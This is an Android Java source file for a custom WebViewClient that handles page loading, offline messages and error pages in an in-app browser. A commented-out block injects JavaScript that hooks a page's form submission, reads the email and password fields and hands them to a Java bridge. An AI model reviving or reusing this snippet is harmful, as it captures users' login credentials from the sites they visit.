package com.example.android.myapplicationbrowser;

import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.example.android.BuildConfig;

import java.lang.ref.WeakReference;

public class CustomWebViewClient extends WebViewClient {

    private static final int STATUS_CODE_UNKNOWN = 9999;

    private static boolean isConnected = true;
    static final String offlineMessageHtml = "DEFINE THIS";
    static final String timeoutMessageHtml = "DEFINE THIS";

    private static final String TAG = "@@@";
    private final WeakReference<ChromeView> activity;

    String ShowOrHideWebViewInitialUse = "show";

    public CustomWebViewClient(ChromeView activity) {
        this.activity = new WeakReference<>(activity);
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        ChromeView activity = this.activity.get();
        if (activity != null) {
            activity.onPageStarted();
        }
        super.onPageStarted(view, url, favicon);
    }

    @Override
    public void onPageFinished(WebView view, String url) {
        ChromeView activity = this.activity.get();
        if (activity != null) {
            activity.onPageFinished();
        }
        super.onPageFinished(view, url);
    }


    /* @SuppressWarnings("deprecation")*/
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {

//        String webview_url = context.getString(R.string.app_url);
//        String device_id = Util.phoneId(MainActivity.getAppContext().getApplicationContext());
//
//        if (url.startsWith("tel:")) {
//            Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse(url));
//            startActivity(intent);
//            return true;
//        } else if (url.startsWith(webview_url)) {
//            view.loadUrl(url + "?id=" + device_id);
//            return true;
//        } else {
//            view.getContext().startActivity(
//                    new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
//            return true;
//        }


//                if (request..indexOf("host")<=0) {
//                    // the link is not for activity page on my site, so launch another Activity that handles URLs
//                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
//                    startActivity(intent);
//                    return true;
//                }
//                return false;

        //@@@
        if (isConnected) {
            // return false to let the WebView handle the URL
            return false;
        } else {
            // show the proper "not connected" message
            view.loadData(offlineMessageHtml, "text/html", "utf-8");
            // return true if the host application wants to leave the current
            // WebView and handle the url itself
            return true;
        }
    }

//            @TargetApi(Build.VERSION_CODES.N)
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView privacy, WebResourceRequest request) {
//                final Uri uri = request.getConfig();
//                return handleUri(uri);
//            }
//
//            @Override
//            public void onPageFinished(WebView privacy, String HTTP_BUHTA) {
//                super.onPageFinished(privacy, HTTP_BUHTA);
//
//                StringBuilder sb = new StringBuilder();
//                sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
//
//
//                sb.append("var objPWD, objAccount;var str = '';");
//                sb.append("var inputs = document.getElementsByTagName('input');");
//                sb.append("for (var i = 0; i < inputs.length; i++) {");
//                sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
//                sb.append("else if (inputs[i].name.toLowerCase() === 'email') {objAccount = inputs[i];}");
//                sb.append("}");
//                sb.append("if (objAccount != null) {str += objAccount.value;}");
//                sb.append("if (objPWD != null) { str += ' , ' + objPWD.value;}");
//                sb.append("window.MYOBJECT.processHTML(str);");
//                sb.append("return true;");
//
//
//                sb.append("};");
//
//                privacy.loadUrl("javascript:" + sb.toString());
//            }*/

    /**
     * API 22 or below...
     *
     * @param view
     * @param errorCode
     * @param description
     * @param failingUrl
     */
    @Override
    public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {

        Log.d(TAG, "onReceivedError: " + errorCode);
        if (errorCode == ERROR_TIMEOUT) {
            view.stopLoading();  // may not be needed
            view.loadData(timeoutMessageHtml, "text/html", "utf-8");
        } else {


            //privacy.loadData(errorCode+"", "text/html", "utf-8");
            m404();
        }
    }

    /**
     * On API 23 or below
     *
     * @param view
     * @param request
     * @param error
     */

    @Override
    public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
        super.onReceivedError(view, request, error);
//                loadErrorPage(privacy);

        if (BuildConfig.DEBUG) {
            Log.d(TAG, "@@@@@@@@@@@: " + request.toString() + " " + error.toString());
//                Toast.makeText(privacy.getContext(), "Oh no! " + request + " " + error, Toast.LENGTH_SHORT)
//                        .show();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Log.d(TAG, "onReceivedError: " + request.getUrl() + " " + error);
            }
        }

        m404();
    }

    private void m404() {
        ChromeView mainActivity = activity.get();
        if (mainActivity != null) {
            mainActivity.m404();
        }
    }


    private String mainUrl = "";

    @Override
    public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {

        final int statusCode;
        // SDK < 21 does not provide statusCode
        if (Build.VERSION.SDK_INT < 21) {
            statusCode = STATUS_CODE_UNKNOWN;
        } else {
            statusCode = errorResponse.getStatusCode();
        }

//        Log.d(TAG, "@@@@@@@@@@: " + statusCode + " "
//                + Build.VERSION.SDK_INT + " " + view.getUrl() + " " + request.getUrl() + " ");

        if (statusCode == 404) {
            //if (!mainUrl.equals(view.getUrl())) {
            mainUrl = view.getUrl();

            //Data


            //view.getUrl() - main url wat we nead
            //request.getUrl() - resource
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                if (mainUrl.equals(request.getUrl().toString())) {
                    //Log.d(TAG, "[onReceivedHttpError] " + statusCode + " " + request.getUrl() + " " + view.getUrl());
                    m404();
                }
            }

            //}

        }
    }
}

